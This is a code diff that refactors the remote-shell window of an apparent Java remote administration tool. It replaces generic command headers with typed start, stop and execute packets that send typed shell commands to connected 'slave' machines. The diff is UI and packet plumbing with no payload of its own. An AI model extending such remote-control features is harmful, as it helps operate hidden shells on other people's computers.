@@ -19,8 +19,9 @@ import javax.swing.ScrollPaneConstants;
 import javax.swing.border.EmptyBorder;
 
 import com.redpois0n.Slave;
-import com.redpois0n.packets.OutgoingHeader;
-import com.redpois0n.packets.incoming.PacketBuilder;
+import com.redpois0n.packets.outgoing.Packet23RemoteShellStart;
+import com.redpois0n.packets.outgoing.Packet24RemoteShellStop;
+import com.redpois0n.packets.outgoing.Packet25RemoteShellExecute;
 
 
 @SuppressWarnings("serial")
@@ -30,7 +31,7 @@ public class FrameRemoteShell extends BaseFrame {
 
 	public static HashMap<Slave, FrameRemoteShell> instances = new HashMap<Slave, FrameRemoteShell>();
 	public Slave slave;
-	private JTextField textField;
+	private JTextField txtCommand;
 	public JTextPane textPane;
 
 	public FrameRemoteShell(Slave slave) {
@@ -52,17 +53,18 @@ public class FrameRemoteShell extends BaseFrame {
 		contentPane = new JPanel();
 		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
 		setContentPane(contentPane);
-		textField = new JTextField();
-		textField.addKeyListener(new KeyAdapter() {
+		txtCommand = new JTextField();
+		txtCommand.addKeyListener(new KeyAdapter() {
 			@Override
 			public void keyPressed(KeyEvent e) {
-				if (e.getKeyCode() == KeyEvent.VK_ENTER && textField.getText().trim().length() > 0) {
-					sl.addToSendQueue(new PacketBuilder(OutgoingHeader.CMD_EXECUTE, new String[] { textField.getText().trim() }));
-					textField.setText("");			
+				if (e.getKeyCode() == KeyEvent.VK_ENTER && txtCommand.getText().trim().length() > 0) {
+					String command = txtCommand.getText().trim();
+					sl.addToSendQueue(new Packet25RemoteShellExecute(command));
+					txtCommand.setText("");			
 				}
 			}
 		});
-		textField.setColumns(10);
+		txtCommand.setColumns(10);
 
 		JScrollPane scrollPane = new JScrollPane();
 		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
@@ -76,22 +78,22 @@ public class FrameRemoteShell extends BaseFrame {
 		gl_contentPane.setHorizontalGroup(
 			gl_contentPane.createParallelGroup(Alignment.LEADING)
 				.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 485, GroupLayout.PREFERRED_SIZE)
-				.addComponent(textField, GroupLayout.PREFERRED_SIZE, 485, GroupLayout.PREFERRED_SIZE)
+				.addComponent(txtCommand, GroupLayout.PREFERRED_SIZE, 485, GroupLayout.PREFERRED_SIZE)
 		);
 		gl_contentPane.setVerticalGroup(
 			gl_contentPane.createParallelGroup(Alignment.LEADING)
 				.addGroup(gl_contentPane.createSequentialGroup()
 					.addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 245, GroupLayout.PREFERRED_SIZE)
 					.addGap(1)
-					.addComponent(textField, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
+					.addComponent(txtCommand, GroupLayout.PREFERRED_SIZE, GroupLayout.DEFAULT_SIZE, GroupLayout.PREFERRED_SIZE))
 		);
 		contentPane.setLayout(gl_contentPane);
 		
-		slave.addToSendQueue(OutgoingHeader.CMD_RUN);
+		slave.addToSendQueue(new Packet23RemoteShellStart());
 	}
 
 	public void exit() {
-		slave.addToSendQueue(OutgoingHeader.CMD_END);
+		slave.addToSendQueue(new Packet24RemoteShellStop());
 		slave = null;
 		instances.remove(slave);
 	}
